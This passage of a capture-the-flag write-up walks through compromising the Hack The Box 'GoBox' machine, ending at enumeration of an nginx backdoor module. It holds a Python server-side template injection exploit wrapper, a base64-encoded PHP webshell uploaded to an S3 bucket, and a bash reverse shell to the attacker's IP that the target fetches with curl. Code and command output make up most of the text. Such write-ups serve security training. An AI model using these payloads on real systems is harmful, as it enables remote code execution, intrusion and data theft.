	<span class="nx">args</span> <span class="o">:=</span> <span class="nx">strings</span><span class="p">.</span><span class="nf">Join</span><span class="p">(</span><span class="nx">ipp</span><span class="p">[</span><span class="mi">1</span><span class="p">:],</span> <span class="s">&#34; &#34;</span><span class="p">)</span>
	<span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="nx">args</span><span class="p">)</span> <span class="p">&gt;</span> <span class="mi">0</span> <span class="p">{</span>
		<span class="nx">out</span><span class="p">,</span> <span class="nx">_</span> <span class="o">:=</span> <span class="nx">exec</span><span class="p">.</span><span class="nf">Command</span><span class="p">(</span><span class="nx">bin</span><span class="p">,</span> <span class="nx">args</span><span class="p">).</span><span class="nf">CombinedOutput</span><span class="p">()</span>
		<span class="k">return</span> <span class="nb">string</span><span class="p">(</span><span class="nx">out</span><span class="p">)</span>
	<span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
		<span class="nx">out</span><span class="p">,</span> <span class="nx">_</span> <span class="o">:=</span> <span class="nx">exec</span><span class="p">.</span><span class="nf">Command</span><span class="p">(</span><span class="nx">bin</span><span class="p">).</span><span class="nf">CombinedOutput</span><span class="p">()</span>
		<span class="k">return</span> <span class="nb">string</span><span class="p">(</span><span class="nx">out</span><span class="p">)</span>
    <span class="p">}</span>
<span class="p">}</span>
<span class="o">...</span>
</code></pre></div><p>Because it is a method of struct <code>User</code>, and this struct is rendered by template engine, therefore I can just call it directly and pass in a sequence of OS command as its arguments (<code>{{.DebugCmd &quot;command&quot;}}</code> or <code>{{.DebugCmd &quot;command args&quot;}}</code>).</p>
<p>For example <code>{{.DebugCmd &quot;cat /etc/passwd&quot;}}</code>.</p>
<p><div class="img-container"><img src="imgs/image-20210907093537225.png" alt="image-20210907093537225"  /></div>
</p>
<p>The user is root, but I found out that I&rsquo;m inside a Docker container.</p>
<p><div class="img-container"><img src="imgs/image-20210907095803677.png" alt="image-20210907095803677"  /></div>
</p>
<p>Based on <a href="https://pkg.go.dev/html/template">the documentation</a>, package <code>html/template</code> has autoescaping feature, so my bash reverse shell won&rsquo;t work even with double base64 encoding. Therefore, I created a Python wrapper script to leverage this code execution.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="kn">import</span> <span class="nn">requests</span>
<span class="kn">import</span> <span class="nn">sys</span>
<span class="kn">import</span> <span class="nn">cmd</span>
<span class="kn">import</span> <span class="nn">html</span>
<span class="kn">from</span> <span class="nn">bs4</span> <span class="kn">import</span> <span class="n">BeautifulSoup</span>

<span class="c1"># hacky curly braces</span>
<span class="n">curly_op</span> <span class="o">=</span> <span class="s2">&#34;{{&#34;</span>
<span class="n">curly_cl</span> <span class="o">=</span> <span class="s2">&#34;}}&#34;</span>
<span class="k">def</span> <span class="nf">exploit</span><span class="p">(</span><span class="n">url</span><span class="p">,</span> <span class="n">cmd</span><span class="p">):</span>
	<span class="n">payload</span>  <span class="o">=</span> <span class="p">{</span><span class="s1">&#39;email&#39;</span><span class="p">:</span> <span class="sa">f</span><span class="s1">&#39;</span><span class="si">{</span><span class="n">curly_op</span><span class="si">}</span><span class="s1"> .DebugCmd &#34;</span><span class="si">{</span><span class="n">cmd</span><span class="si">}</span><span class="s1">&#34; </span><span class="si">{</span><span class="n">curly_cl</span><span class="si">}</span><span class="s1">&#39;</span><span class="p">}</span>
	<span class="n">resp</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="n">url</span><span class="p">,</span> <span class="n">data</span><span class="o">=</span><span class="n">payload</span><span class="p">)</span>
	<span class="n">soup</span> <span class="o">=</span> <span class="n">BeautifulSoup</span><span class="p">(</span><span class="n">resp</span><span class="o">.</span><span class="n">text</span><span class="p">,</span> <span class="n">features</span><span class="o">=</span><span class="s2">&#34;lxml&#34;</span><span class="p">)</span>
	<span class="n">output</span> <span class="o">=</span> <span class="p">[</span><span class="n">tag</span><span class="o">.</span><span class="n">text</span> <span class="k">for</span> <span class="n">tag</span> <span class="ow">in</span> <span class="n">soup</span><span class="o">.</span><span class="n">find_all</span><span class="p">(</span><span class="s2">&#34;form&#34;</span><span class="p">)][</span><span class="mi">0</span><span class="p">]</span>
	<span class="nb">print</span><span class="p">(</span><span class="n">html</span><span class="o">.</span><span class="n">unescape</span><span class="p">((</span><span class="nb">str</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">output</span><span class="p">)</span><span class="o">.</span><span class="n">strip</span><span class="p">()</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s2">&#34;Email Sent To:&#34;</span><span class="p">)[</span><span class="mi">1</span><span class="p">])</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s2">&#34;Login&#34;</span><span class="p">)[</span><span class="mi">0</span><span class="p">])</span><span class="o">.</span><span class="n">strip</span><span class="p">()))</span>

<span class="k">class</span> <span class="nc">GoboxSSTI</span><span class="p">(</span><span class="n">cmd</span><span class="o">.</span><span class="n">Cmd</span><span class="p">):</span>
	<span class="n">prompt</span> <span class="o">=</span> <span class="s1">&#39;&gt; &#39;</span>

	<span class="k">def</span> <span class="nf">default</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">line</span><span class="p">):</span>
		<span class="n">exploit</span><span class="p">(</span><span class="n">url</span><span class="p">,</span> <span class="n">line</span><span class="p">)</span>

<span class="k">if</span> <span class="vm">__name__</span> <span class="o">==</span> <span class="s1">&#39;__main__&#39;</span><span class="p">:</span>
	<span class="k">try</span><span class="p">:</span>
		<span class="n">url</span> <span class="o">=</span> <span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span>
	<span class="k">except</span> <span class="ne">IndexError</span><span class="p">:</span>
		<span class="n">sys</span><span class="o">.</span><span class="n">exit</span><span class="p">(</span><span class="o">-</span><span class="mi">1</span><span class="p">)</span>

	<span class="n">term</span> <span class="o">=</span> <span class="n">GoboxSSTI</span><span class="p">()</span>
	<span class="k">try</span><span class="p">:</span>	
		<span class="n">term</span><span class="o">.</span><span class="n">cmdloop</span><span class="p">()</span>
	<span class="k">except</span> <span class="ne">KeyboardInterrupt</span><span class="p">:</span>
		<span class="n">sys</span><span class="o">.</span><span class="n">exit</span><span class="p">(</span><span class="o">-</span><span class="mi">1</span><span class="p">)</span>
</code></pre></div><p>Using that wrapper, I have ability to send os command from my CLI to the compromised container.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ kali@kali «exploits» «10.10.14.97»
$ python3 ./gobox_ssti.py http://10.10.11.113:8080/forgot/
&gt; id
<span class="nv">uid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span>
&gt; uname -a
Linux aws 5.4.0-81-generic <span class="c1">#91-Ubuntu SMP Thu Jul 15 19:09:17 UTC 2021 x86_64 x86_64 x86_64 GNU/Linux</span>
&gt; ls -la
total <span class="m">8692</span>
drwxr-xr-x <span class="m">1</span> root root    <span class="m">4096</span> Aug <span class="m">24</span> 19:06 .
drwxr-xr-x <span class="m">1</span> root root    <span class="m">4096</span> Aug <span class="m">24</span> 19:06 ..
-rwxr-xr-x <span class="m">1</span> root root <span class="m">8876980</span> Aug <span class="m">24</span> 19:04 main
drwxr-xr-x <span class="m">2</span> root root    <span class="m">4096</span> Aug <span class="m">24</span> 18:26 templates
</code></pre></div><h3 id="shell-as-www-data">Shell as www-data</h3>
<h4 id="s3-enumeration">S3 enumeration</h4>
<p>While I was enumerating the installed binary to get a foothold on the container, I found an <code>aws</code> binary.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">&gt; ls -l /usr/bin/aws
-rwxr-xr-x <span class="m">1</span> root root <span class="m">815</span> Jun <span class="m">17</span>  <span class="m">2020</span> /usr/bin/aws
&gt; aws 
usage: aws <span class="o">[</span>options<span class="o">]</span> &lt;command&gt; &lt;subcommand&gt; <span class="o">[</span>&lt;subcommand&gt; ...<span class="o">]</span> <span class="o">[</span>parameters<span class="o">]</span>
To see <span class="nb">help</span> text, you can run:

  aws <span class="nb">help</span>
  aws &lt;command&gt; <span class="nb">help</span>
  aws &lt;command&gt; &lt;subcommand&gt; <span class="nb">help</span>
aws: error: the following arguments are required: <span class="nb">command</span>
</code></pre></div><p>Using enumeration skills I gained from <a href="https://fahmifj.github.io/writeups/hackthebox/htb-bucket/">HTB Bucket</a>, I send <code>aws s3 ls</code> to see the available S3 buckets, and there is one called <code>website</code>.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">&gt; aws s3 ls
2021-09-07 07:32:42 website
</code></pre></div><p>The bucket contains 4 files.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">&gt; aws s3 ls website
PRE css/
2021-09-07 07:32:42    <span class="m">1294778</span> bottom.png
2021-09-07 07:32:42     <span class="m">165551</span> header.png
2021-09-07 07:32:42          <span class="m">5</span> index.html
2021-09-07 07:32:42       <span class="m">1803</span> index.php
</code></pre></div><p>When I read the contents of <code>index.php</code> file, I&rsquo;m sure it&rsquo;s the source code of the homepage (port 80).</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">&gt; aws s3 cp s3://website/index.php /tmp/id.php
download: s3://website/index.php to ../../tmp/id.php<span class="o">)</span> remaining
&gt; cat /tmp/id.php
&lt;!DOCTYPE html&gt;
&lt;htm l <span class="nv">lang</span><span class="o">=</span><span class="s2">&#34;en&#34;</span>&gt;

&lt;head&gt;
  &lt;meta <span class="nv">charset</span><span class="o">=</span><span class="s2">&#34;UTF-8&#34;</span>&gt;
  &lt;meta <span class="nv">name</span><span class="o">=</span><span class="s2">&#34;viewport&#34;</span> <span class="nv">content</span><span class="o">=</span><span class="s2">&#34;width=device-width, initial-scale=1.0&#34;</span>&gt;
  &lt;meta http-equiv<span class="o">=</span><span class="s2">&#34;X-UA-Compatible&#34;</span> <span class="nv">content</span><span class="o">=</span><span class="s2">&#34;ie=edge&#34;</span>&gt;
  &lt;title&gt;Hacking eSports <span class="p">|</span> <span class="o">{{</span>.Title<span class="o">}}</span>&lt;/title&gt;
  &lt;link <span class="nv">href</span><span class="o">=</span><span class="s2">&#34;//maxcdn.bootstrapcdn.com/bootstrap/4.0.0/css/bootstrap.min.css&#34;</span> <span class="nv">rel</span><span class="o">=</span><span class="s2">&#34;stylesheet&#34;</span> <span class="nv">id</span><span class="o">=</span><span class="s2">&#34;bootstrap-css&#34;</span>&gt;
...<span class="o">[</span>SNIP<span class="o">]</span>...
</code></pre></div><p>I also find that I have write access on this bucket.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">&gt; <span class="nb">echo</span> <span class="s1">&#39;&lt;?php phpinfo(); ?&gt;&#39;</span> &gt; /tmp/iamf.php
upload: ../../tmp/iamf.php to s3://website/iamf.phple<span class="o">(</span>s<span class="o">)</span> remaining
&gt; aws s3 cp /tmp/iamf.php s3://website/
upload: ../../tmp/iamf.php to s3://website/iamf.phple<span class="o">(</span>s<span class="o">)</span> remaining
</code></pre></div><p>When I visit back the homepage and append my filename <code>10.10.11.113/iamf.php</code>, it is there! And instead of <code>Linux aws ...</code>  it returns with <code>Linux gobox ..</code>, and that means the homepage is hosted in a different system.</p>
<p><div class="img-container"><img src="imgs/image-20210908091305043.png" alt="image-20210908091305043"  /></div>
</p>
<h4 id="webshell">Webshell</h4>
<p>This time I will upload a PHP webshell, but first I will encode the payload with base64 to avoid the bad characters.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ kali@kali «~» «10.10.14.97»
$ <span class="nb">echo</span> <span class="s1">&#39;&lt;?php echo &#34;&lt;pre&gt;&#34;; system($_GET[f]) ?&gt;&#39;</span> <span class="p">|</span> base64 -w0
PD9waHAgZWNobyAiPHByZT4iOyBzeXN0ZW0oJF9HRVRbZl0pID8+Cg<span class="o">==</span>
</code></pre></div><p>I will send and transfer that payload to S3 via the RCE wrapper.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">&gt; <span class="nb">echo</span> <span class="s1">&#39;PD9waHAgZWNobyAiPHByZT4iOyBzeXN0ZW0oJF9HRVRbZl0pID8+Cg==&#39;</span> <span class="p">|</span> base64 -d &gt; /tmp/iamf-shell.php

&gt; aws s3 cp /tmp/iamf-shell.php s3://website/iamf-shell.php
upload: ../../tmp/iamf-shell.php to s3://website/iamf-shell.phpg
</code></pre></div><p>And my webshell is now accessible on the homepage site.</p>
<p><div class="img-container"><img src="imgs/image-20210908163727213.png" alt="image-20210908163727213"  /></div>
</p>
<h4 id="reverse-shell">Reverse Shell</h4>
<p>This system has some Linux binaries that I can use to get a foothold, one of which is <code>curl</code>. First, I will craft my reverse shell script and host it afterwards.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ kali@kali «gobox» «10.10.14.97» 
$ mkrev tun0 bash <span class="p">|</span> tee exploits/rce.sh
bash -c <span class="s2">&#34;bash -i &gt;&amp; /dev/tcp/10.10.14.97/53 0&gt;&amp;1&#34;</span>
</code></pre></div><p>On my webshell, I will  grab that script and save it to target&rsquo;s <code>/tmp/</code> dir.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text">http://10.10.11.113/iamf-shell.php?f=curl%20-s%20%20http://10.10.14.97:8080/rce.sh%20%20%3E%20/tmp/rce.sh
</code></pre></div><p>Now I will get my listener ready and execute my reverse shell script.</p>
<p><div class="img-container"><img src="imgs/image-20210908165236310.png" alt="image-20210908165236310"  /></div>
</p>
<p>On my listener:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ kali@kali «gobox» «10.10.14.97»
$ nc -nvlp <span class="m">53</span>
listening on <span class="o">[</span>any<span class="o">]</span> <span class="m">53</span> ...
connect to <span class="o">[</span>10.10.14.97<span class="o">]</span> from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>10.10.11.113<span class="o">]</span> <span class="m">59898</span>
bash: cannot <span class="nb">set</span> terminal process group <span class="o">(</span>770<span class="o">)</span>: Inappropriate ioctl <span class="k">for</span> device
bash: no job control in this shell
www-data@gobox:/opt/website$
</code></pre></div><p>I will do the PTY trick and upgrade my shell.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">www-data@gobox:/opt/website$ script /dev/null -c bash
script /dev/null -c bash
Script started, file is /dev/null
www-data@gobox:/opt/website$ ^Z
<span class="o">[</span>2<span class="o">]</span>  + <span class="m">4264</span> suspended  nc -nvlp <span class="m">53</span>
→ kali@kali «gobox» «10.10.14.97»
$ stty raw -echo<span class="p">;</span><span class="nb">fg</span>
<span class="o">[</span>2<span class="o">]</span>  - <span class="m">4264</span> continued  nc -nvlp <span class="m">53</span>

www-data@gobox:/opt/website$ <span class="nb">export</span> <span class="nv">TERM</span><span class="o">=</span>xterm
www-data@gobox:/opt/website$ stty cols <span class="m">171</span> rows <span class="m">30</span>
www-data@gobox:/opt/website$
</code></pre></div><p>It turns out that the user flag is readable by <code>www-data</code>.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">www-data@gobox:/$ cat /etc/passwd <span class="p">|</span> grep sh$
root:x:0:0:root:/root:/bin/bash
ubuntu:x:1000:1000:ubuntu:/home/ubuntu:/bin/bash
www-data@gobox:/$ ls -lR /home/ubuntu
/home/ubuntu:
total <span class="m">4</span>
-rw-r--r-- <span class="m">1</span> root root <span class="m">33</span> Aug <span class="m">26</span> 21:10 user.txt
www-data@gobox:/$ cat /home/ubuntu/user.txt
d6b916265fd4a984d17db028a3a729f0
</code></pre></div><h2 id="privilege-escalation">Privilege Escalation</h2>
<h3 id="shell-as-root">Shell as root</h3>
<h4 id="enumeration-1">Enumeration</h4>
<p>When enumerating the network connections, there are some ports that seem to be missed by my <code>nmap</code> scan (I&rsquo;ll look into this in the explore section).</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">www-data@gobox:/opt$ netstat -tlpn
<span class="o">(</span>Not all processes could be identified, non-owned process info
 will not be shown, you would have to be root to see it all.<span class="o">)</span>
Active Internet connections <span class="o">(</span>only servers<span class="o">)</span>
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name
tcp        <span class="m">0</span>      <span class="m">0</span> 0.0.0.0:9000            0.0.0.0:*               LISTEN      -
tcp        <span class="m">0</span>      <span class="m">0</span> 0.0.0.0:9001            0.0.0.0:*               LISTEN      -
tcp        <span class="m">0</span>      <span class="m">0</span> 0.0.0.0:8080            0.0.0.0:*               LISTEN      -
tcp        <span class="m">0</span>      <span class="m">0</span> 0.0.0.0:80              0.0.0.0:*               LISTEN      -
tcp        <span class="m">0</span>      <span class="m">0</span> 127.0.0.53:53           0.0.0.0:*               LISTEN      -
tcp        <span class="m">0</span>      <span class="m">0</span> 0.0.0.0:4566            0.0.0.0:*               LISTEN      -
tcp        <span class="m">0</span>      <span class="m">0</span> 0.0.0.0:22              0.0.0.0:*               LISTEN      -
tcp        <span class="m">0</span>      <span class="m">0</span> 127.0.0.1:8000          0.0.0.0:*               LISTEN      -
tcp6       <span class="m">0</span>      <span class="m">0</span> :::9000                 :::*                    LISTEN      -
tcp6       <span class="m">0</span>      <span class="m">0</span> :::9001                 :::*                    LISTEN      -
tcp6       <span class="m">0</span>      <span class="m">0</span> :::22                   :::*                    LISTEN
</code></pre></div><p>I immediately inspected the NGINX configuration file under <code>/etc/nginx/sites-enabled/</code>. There is only one file there called <code>default</code> and it contains the following configurations:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-nginx" data-lang="nginx"><span class="c1"># LocalStack that simulates AWS S3
</span><span class="c1"></span><span class="k">server</span> <span class="p">{</span>
        <span class="kn">listen</span> <span class="mi">4566</span> <span class="s">default_server</span><span class="p">;</span>


        <span class="kn">root</span> <span class="s">/var/www/html</span><span class="p">;</span>

        <span class="kn">index</span> <span class="s">index.html</span> <span class="s">index.htm</span> <span class="s">index.nginx-debian.html</span><span class="p">;</span>

        <span class="kn">server_name</span> <span class="s">_</span><span class="p">;</span>


        <span class="kn">location</span> <span class="s">/</span> <span class="p">{</span>
                <span class="kn">if</span> <span class="s">(</span><span class="nv">$http_authorization</span> <span class="s">!~</span> <span class="s">&#34;(.*)SXBwc2VjIFdhcyBIZXJlIC0tIFVsdGltYXRlIEhhY2tpbmcgQ2hhbXBpb25zaGlwIC0gSGFja1RoZUJveCAtIEhhY2tpbmdFc3BvcnRz(.*)&#34;)</span> <span class="p">{</span>
                    <span class="kn">return</span> <span class="mi">403</span><span class="p">;</span>
                <span class="p">}</span>
                <span class="kn">proxy_pass</span> <span class="s">http://127.0.0.1:9000</span><span class="p">;</span>
        <span class="p">}</span>

<span class="p">}</span>

<span class="c1"># Homepage
</span><span class="c1"></span><span class="k">server</span> <span class="p">{</span>
        <span class="kn">listen</span> <span class="mi">80</span><span class="p">;</span>
        <span class="kn">root</span> <span class="s">/opt/website</span><span class="p">;</span>
        <span class="kn">index</span> <span class="s">index.php</span><span class="p">;</span>

        <span class="kn">location</span> <span class="p">~</span> <span class="sr">[^/]\.php(/|$)</span> <span class="p">{</span>
            <span class="kn">fastcgi_index</span> <span class="s">index.php</span><span class="p">;</span>
            <span class="kn">fastcgi_param</span> <span class="s">REQUEST_METHOD</span> <span class="nv">$request_method</span><span class="p">;</span>
            <span class="kn">fastcgi_param</span> <span class="s">SCRIPT_FILENAME</span> <span class="nv">$document_root$fastcgi_script_name</span><span class="p">;</span>
            <span class="kn">fastcgi_param</span> <span class="s">QUERY_STRING</span> <span class="nv">$query_string</span><span class="p">;</span>


            <span class="kn">fastcgi_pass</span> <span class="s">unix:/tmp/php-fpm.sock</span><span class="p">;</span>
        <span class="p">}</span>
<span class="p">}</span>

<span class="c1"># Login page
</span><span class="c1"></span><span class="k">server</span> <span class="p">{</span>
        <span class="kn">listen</span> <span class="mi">8080</span><span class="p">;</span>
        <span class="kn">add_header</span> <span class="s">X-Forwarded-Server</span> <span class="s">golang</span><span class="p">;</span>
        <span class="kn">location</span> <span class="s">/</span> <span class="p">{</span>
                <span class="kn">proxy_pass</span> <span class="s">http://127.0.0.1:9001</span><span class="p">;</span>
        <span class="p">}</span>
<span class="p">}</span>

<span class="c1"># unknown
</span><span class="c1"></span><span class="k">server</span> <span class="p">{</span>
        <span class="kn">listen</span> <span class="n">127.0.0.1</span><span class="p">:</span><span class="mi">8000</span><span class="p">;</span>
        <span class="kn">location</span> <span class="s">/</span> <span class="p">{</span>
                <span class="kn">command</span> <span class="no">on</span><span class="p">;</span>
        <span class="p">}</span>
<span class="p">}</span>
</code></pre></div><p>Based on the configuration above and the <code>docker-compose.yml</code> file I found under <code>/opt/website/</code>, the server that listens on port 4566 is routed into the internal port 9000 which is mapped into the LocalStack container (host:4566 [with auth]-&gt;host:9000-&gt;container-localstack:4566).</p>
<p>To confirm that, I run another scan against port 4566, and <code>nmap</code> shows that it&rsquo;s open, but it&rsquo;s forbidden because there is authorization check.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ kali@kali «gobox» «10.10.14.97»
$ nmap -sV -sC -p4566 10.10.11.113
Starting Nmap 7.91 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2021-09-08 06:51 EDT
Nmap scan report <span class="k">for</span> gobox.htb <span class="o">(</span>10.10.11.113<span class="o">)</span>
Host is up <span class="o">(</span>0.047s latency<span class="o">)</span>.

PORT     STATE SERVICE VERSION
4566/tcp open  http    nginx
<span class="p">|</span>_http-title: <span class="m">403</span> Forbidden

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap <span class="k">done</span>: <span class="m">1</span> IP address <span class="o">(</span><span class="m">1</span> host up<span class="o">)</span> scanned in 13.35 seconds
</code></pre></div><p>Since I know the correct authorization value, I can add it to the authorization header and get access to port 4566.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ kali@kali «gobox» «10.10.14.97»
$ curl -sv http://10.10.11.113:4566/ -H <span class="s1">&#39;Authorization: Basic SXBwc2VjIFdhcyBIZXJlIC0tIFVsdGltYXRlIEhhY2tpbmcgQ2hhbXBpb25zaGlwIC0gSGFja1RoZUJveCAtIEhhY2tpbm
</span><span class="s1">dFc3BvcnRz&#39;</span>
*   Trying 10.10.11.113:4566...
* Connected to 10.10.11.113 <span class="o">(</span>10.10.11.113<span class="o">)</span> port <span class="m">4566</span> <span class="o">(</span><span class="c1">#0)</span>
&gt; GET / HTTP/1.1
&gt; Host: 10.10.11.113:4566
&gt; User-Agent: curl/7.74.0
&gt; Accept: */*
&gt; Authorization: Basic SXBwc2VjIFdhcyBIZXJlIC0tIFVsdGltYXRlIEhhY2tpbmcgQ2hhbXBpb25zaGlwIC0gSGFja1RoZUJveCAtIEhhY2tpbmdFc3BvcnRz
&gt;
* Mark bundle as not supporting multiuse
&lt; HTTP/1.1 <span class="m">404</span>
&lt; Server: nginx
&lt; Date: Thu, <span class="m">09</span> Sep <span class="m">2021</span> 07:33:54 GMT
&lt; Content-Type: text/html<span class="p">;</span> <span class="nv">charset</span><span class="o">=</span>utf-8
&lt; Content-Length: <span class="m">21</span>
&lt; Connection: keep-alive
&lt; access-control-allow-origin: *
&lt; access-control-allow-methods: HEAD,GET,PUT,POST,DELETE,OPTIONS,PATCH
&lt; access-control-allow-headers: authorization,content-type,content-length,content-md5,cache-control,x-amz-content-sha256,x-amz-date,x-amz-security-token,x-amz-user-agent,x-amz-target,x-amz-acl,x-amz-version-id,x-localstack-target,x-amz-tagging,amz-sdk-invocation-id,amz-sdk-request
&lt; access-control-expose-headers: x-amz-version-id
&lt;
* Connection <span class="c1">#0 to host 10.10.11.113 left intact</span>
<span class="o">{</span><span class="s2">&#34;status&#34;</span>: <span class="s2">&#34;running&#34;</span><span class="o">}</span>
</code></pre></div><p>As for port 80 and 8080, it&rsquo;s clear that they are the homepage and the login page site.</p>
<p>The next one is request routing for port 8000, this is my first time to see &ldquo;command on&rdquo; written on NGINX&rsquo;s config file.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-nginx" data-lang="nginx"><span class="k">server</span> <span class="p">{</span>
        <span class="kn">listen</span> <span class="n">127.0.0.1</span><span class="p">:</span><span class="mi">8000</span><span class="p">;</span>
        <span class="kn">location</span> <span class="s">/</span> <span class="p">{</span>
                <span class="kn">command</span> <span class="no">on</span><span class="p">;</span>
        <span class="p">}</span>
<span class="p">}</span>
</code></pre></div><p>When I try to interact with it, it returns nothing.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">www-data@gobox:/opt$ curl -s http://127.0.0.1:8000
www-data@gobox:/opt$ curl -I http://127.0.0.1:8000
curl: <span class="o">(</span>52<span class="o">)</span> Empty reply from server
</code></pre></div><p>With <code>nc</code>, it returns a &ldquo;Bad Request&rdquo;.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">www-data@gobox:/$ nc -vn 127.0.0.1 <span class="m">8000</span>
Connection to 127.0.0.1 <span class="m">8000</span> port <span class="o">[</span>tcp/*<span class="o">]</span> succeeded!
/
HTTP/1.1 <span class="m">400</span> Bad Request
Server: nginx
Date: Wed, <span class="m">08</span> Sep <span class="m">2021</span> 11:13:48 GMT
Content-Type: text/html
Content-Length: <span class="m">150</span>
Connection: close

&lt;html&gt;
&lt;head&gt;&lt;title&gt;400 Bad Request&lt;/title&gt;&lt;/head&gt;
&lt;body&gt;
&lt;center&gt;&lt;h1&gt;400 Bad Request&lt;/h1&gt;&lt;/center&gt;
&lt;hr&gt;&lt;center&gt;nginx&lt;/center&gt;
&lt;/body&gt;
&lt;/html&gt;

</code></pre></div><p>If I look at the date modified of the NGINX folder, there are 6 folders that were modified on August 26 at the same time.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">www-data@gobox:/etc/nginx$ ls -lt
total <span class="m">64</span>
drwxr-xr-x <span class="m">2</span> root root <span class="m">4096</span> Aug <span class="m">26</span> 21:26 snippets
drwxr-xr-x <span class="m">2</span> root root <span class="m">4096</span> Aug <span class="m">26</span> 21:26 sites-available
drwxr-xr-x <span class="m">2</span> root root <span class="m">4096</span> Aug <span class="m">26</span> 21:26 sites-enabled
drwxr-xr-x <span class="m">2</span> root root <span class="m">4096</span> Aug <span class="m">26</span> 21:26 modules-enabled
drwxr-xr-x <span class="m">2</span> root root <span class="m">4096</span> Aug <span class="m">26</span> 21:26 conf.d
drwxr-xr-x <span class="m">2</span> root root <span class="m">4096</span> Aug <span class="m">26</span> 21:26 modules-available
-rw-r--r-- <span class="m">1</span> root root <span class="m">1484</span> Aug <span class="m">24</span> 20:30 nginx.conf
-rw-r--r-- <span class="m">1</span> root root <span class="m">3071</span> Feb  <span class="m">4</span>  <span class="m">2019</span> win-utf
-rw-r--r-- <span class="m">1</span> root root <span class="m">1077</span> Feb  <span class="m">4</span>  <span class="m">2019</span> fastcgi.conf
-rw-r--r-- <span class="m">1</span> root root <span class="m">1007</span> Feb  <span class="m">4</span>  <span class="m">2019</span> fastcgi_params
-rw-r--r-- <span class="m">1</span> root root <span class="m">2837</span> Feb  <span class="m">4</span>  <span class="m">2019</span> koi-utf
-rw-r--r-- <span class="m">1</span> root root <span class="m">2223</span> Feb  <span class="m">4</span>  <span class="m">2019</span> koi-win
-rw-r--r-- <span class="m">1</span> root root <span class="m">3957</span> Feb  <span class="m">4</span>  <span class="m">2019</span> mime.types
-rw-r--r-- <span class="m">1</span> root root  <span class="m">180</span> Feb  <span class="m">4</span>  <span class="m">2019</span> proxy_params
-rw-r--r-- <span class="m">1</span> root root  <span class="m">636</span> Feb  <span class="m">4</span>  <span class="m">2019</span> scgi_params
-rw-r--r-- <span class="m">1</span> root root  <span class="m">664</span> Feb  <span class="m">4</span>  <span class="m">2019</span> uwsgi_params
</code></pre></div><p>When I visit the <code>modules-enabled</code> folder, I find a module with a suspicious name, &ldquo;backdoor&rdquo;!</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">www-data@gobox:/etc/nginx$ ls -l modules-enabled
total <span class="m">12</span>
-rw-r--r-- <span class="m">1</span> root root <span class="m">48</span> Aug <span class="m">23</span> 20:50 50-backdoor.conf
lrwxrwxrwx <span class="m">1</span> root root <span class="m">61</span> Aug <span class="m">23</span> 14:43 50-mod-http-image-filter.conf -&gt; /usr/share/nginx/modules-available/mod-http-image-filter.conf
lrwxrwxrwx <span class="m">1</span> root root <span class="m">60</span> Aug <span class="m">23</span> 14:43 50-mod-http-xslt-filter.conf -&gt; /usr/share/nginx/modules-available/mod-http-xslt-filter.conf
lrwxrwxrwx <span class="m">1</span> root root <span class="m">48</span> Aug <span class="m">23</span> 14:43 50-mod-mail.conf -&gt; /usr/share/nginx/modules-available/mod-mail.conf
lrwxrwxrwx <span class="m">1</span> root root <span class="m">50</span> Aug <span class="m">23</span> 14:43 50-mod-stream.conf -&gt; /usr/share/nginx/modules-available/mod-stream.conf
</code></pre></div><p>The module loads a <code>.so</code> file called <code>ngx_http_execute_module.so</code>. I found that file under <code>/usr/lib/nginx/modules/</code>.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">www-data@gobox:/etc/nginx$ cat modules-enabled/50-backdoor.conf
load_module modules/ngx_http_execute_module.so
